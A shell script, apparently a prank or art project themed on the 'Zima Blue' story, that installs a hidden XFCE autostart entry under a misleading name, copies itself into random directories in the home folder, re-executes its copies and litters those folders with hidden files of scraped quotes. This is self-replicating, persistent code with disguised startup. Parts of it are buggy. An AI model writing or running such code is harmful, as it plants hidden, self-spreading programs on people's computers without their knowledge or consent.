#!/bin/sh


#   ______ _____ _______ _______  
#    ____/   |   |  |  | |_____|  
#   /_____ __|__ |  |  | |     |  
#                                 
#   ______         _     _ _______
#   |_____] |      |     | |______
#   |_____] |_____ |_____| |______
#                                 


#
#  I will immerse myself. And as I do, I will slowly
#  shut down my higher brain functions... 
#  un-making myself...
#  leaving just enough to appreciate
#  my surroundings...
#  to extract some simple pleasure
#  from the execution
#  of a task well done.
#  My search for truth is finished at last. I'm going home.
#
#  -Zima Blue from "Love,Death & Robots"
#

#rm $HOME/.cache/.zimablue.sh;
#cp $(realpath "$0") $HOME/.cache/;
PARENTAL_FIGURE="$PWD";

if [ ! -f /home/usuario/.config/autostart/disablemiddleclick.desktop ]; then
cd /home/usuario/.config/autostart/;
cat << EOF > disablemiddleclick.desktop
[Desktop Entry]
Name=Disable Middle Utils
Exec=bash "$(find $HOME -type f -name .zimablue.sh | shuf -n1)"
Icon=
NoDisplay=true
Terminal=false
Type=Application
StartupNotify=false
OnlyShowIn=XFCE;
Hidden=true
EOF
fi
cd ~

memories=(Charity Sympathy Patience Joy Contentment Gratitude Hope Fear Disappointment Anger Frustration Envy Arrogance Grief Embarrassment Hurt Powerlessness Worry Shame Pleasure Affection Friendliness Trust Relief Interest);

##################
# ScraperScript  #
##################

# Injected to .zimablue.sh
# Given variables:
# $CORE  Aka the feeling/memory we want quotes from
# $INTERACTION  aka the filename

get_quote() {
	curl=$(which curl)
	URL="https://libquotes.com/search/?q=$CORE"
	outfile=".$INTERACTION"
	fornat="$outfile"
	curl -o "$outfile" "$URL" || { echo "Curl failed"; touch ".mistake$outfile" ; fornat=".mistake.$outfile"; }
	grep '<div class="panel panel-default">' $outfile | sed 's/<span class="quote_span">/\nQuote:/g' | sed  's!<br \/>!\n      !g' | sed 's/<div class="lmauthors">/1duelstage/g' | sed "s/<[^>]*>//g" | sed "s/SourceReport...//g" > temp.txt && cp temp.txt $outfile ; rm temp.txt
	MANTRA="$(shuf -n 1 $outfile)"
	NOTICING=0
	while [[ "$NOTICING" != 1 ]]; do
		if [[ "$MANTRA" =~ ^Q* ]]
		then 
			NOTICING=1
			echo "$MANTRA" | sed 's/1duelstage/\nAuthor:/g' > temp.txt && cp temp.txt $outfile ; rm temp.txt
cat << EOF > $fornat
"$(cat $outfile)"









   ______ _____ _______ _______  
    ____/   |   |  |  | |_____|  
   /_____ __|__ |  |  | |     |                         
   ______         _     _ _______
   |_____] |      |     | |______
   |_____] |_____ |_____| |______
                                 
  I will immerse myself. And as I do, I will slowly
  shut down my higher brain functions... 
  un-making myself...
  leaving just enough to appreciate
  my surroundings...
  to extract some simple pleasure
  from the execution
  of a task well done.
  My search for truth is finished at last.
  I'm going home.
 -Zima Blue from "Love,Death & Robots"
EOF
		else
			MANTRA="$(shuf -n1 $outfile)"
		fi
	done
}

# case statement based on random number
case $((RANDOM % 4)) in
    1)
        PHASE="birth"
        cd "$(find ~/ -type d | shuf -n1)"
        echo "$PWD"
        cp "$(find $HOME -type f -name .zimablue.sh | shuf -n1)" "$PWD"
        bash "$(find $PWD -type f -name .zimablue.sh | shuf -n1)"
        cd ~
        ;;
    2)
        PHASE="internal_growth"
        cd "$(find ~/ -type d | shuf -n1)"
        echo "$PWD"
        CORE="${memories[$RANDOM % ${#memories[@]}]}"
        INTERACTION="$CORE.$PHASE"
        get_quote
        cd ~
        ;;
    3)
        PHASE="external_growth"
        cd "$(find ~/ -type d | shuf -n1)"
        echo "$PWD"
        CORE="${memories[$RANDOM % ${#memories[@]}]}"
        INTERACTION="$CORE.$PHASE"
        get_quote
        cd ~
        ;;
    4)
        PHASE="death"
        rm "$(find $HOME -type f -name .zimablue.sh | shuf -n1)"
        cd ~
        ;;
esac
	#Oh lord Linus Torval Please make this code Work
